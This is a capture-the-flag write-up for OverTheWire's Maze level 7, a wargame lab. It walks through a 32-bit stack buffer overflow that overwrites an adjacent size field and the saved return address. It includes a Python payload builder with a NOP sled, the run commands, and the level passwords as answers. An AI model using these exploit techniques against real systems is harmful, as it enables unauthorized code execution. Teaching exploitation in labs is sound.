# Maze Level 7 → 8

## Goal
Exploit a buffer overflow where a user-controlled `size` field sits just short of the saved return address on the stack. By writing past the buffer we both (1) enlarge the later copy via that size field and (2) plant a return address that points at our shellcode.

## Concepts you'll learn
- Reading stack frames on **32-bit x86** to locate a saved return slot (here at offset `0x40`).
- Exploiting a "length field next to the saved return" shape — a classic overflow variant.
- Composing a padded payload by offset instead of by trial-and-error.
- Why stack addresses like `0xffffd4e9` change between sessions and must be re-derived.

## How to log in

```
$ ssh maze7@maze.labs.overthewire.org -p 2225
```

Password is `B6XkM3Syq6` (from level 6).

## Walkthrough

### 1. Map the stack frame
In `gdb`, break just after the vulnerable input is read and inspect local layout.

```
$ gdb /maze/maze7
(gdb) disas main
(gdb) break *<addr after read>
(gdb) run
(gdb) info frame
```

You will find:

- A user-controlled `size` variable at **offset 46** from the start of the input buffer.
- The saved return address at **offset 0x40** (= 64) from the same base.

Because 46 is before 0x40, writing 46 bytes + overwriting `size` leaves the subsequent copy long enough to keep going past the saved return.

### 2. Pick a size
The next copy uses `size` as its length. Setting `size = 0x44` (68) means the copy reaches **4 bytes past** the saved return slot — enough to fully overwrite the return with our shellcode address.

### 3. Locate the shellcode
Place shellcode somewhere in the input (typically at the tail of the payload). Under `gdb`, check `x/40wx $esp` just before the `ret` to find where your shellcode landed. On the solver's run it was at `0xffffd4e9`. **Re-derive this in your own session** — it depends on environment variables, argv, and cwd.

### 4. Build the payload
Layout:

```
[ 46 null bytes ] [ size = 0x44 0x00 ] [ padding up to offset 0x40 ] [ shellcode addr (0xffffd4e9) ] [ shellcode ]
```

Example with Python:

```
$ python2 -c 'import sys; sys.stdout.write(
    "\x00"*46 +
    "\x44\x00" +
    "\x00"*(0x40 - 46 - 2) +
    "\xe9\xd4\xff\xff" +
    "\x90"*16 +
    "<shellcode>"
)' > /tmp/p
```

The `0xffffd4e9` is written in little-endian order as `\xe9\xd4\xff\xff`. The `\x90` bytes are a NOP sled — they give your address a bit of slack, so a small stack drift still lands inside the sled.

### 5. Run it

```
$ /maze/maze7 < /tmp/p
```

Expected output:

```
$
```

Read the password:

```
$ cat /etc/maze_pass/maze8
eQdZB1qy6L
```

If the exploit segfaults instead of popping a shell, the shellcode address drifted. Re-run under `gdb`, read the new address off the stack, and rebuild the payload.

### 6. Log in as maze8

```
$ ssh maze8@maze.labs.overthewire.org -p 2225
```

## The answer

The password for `maze8` is:

**`eQdZB1qy6L`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/maze/maze7.html>
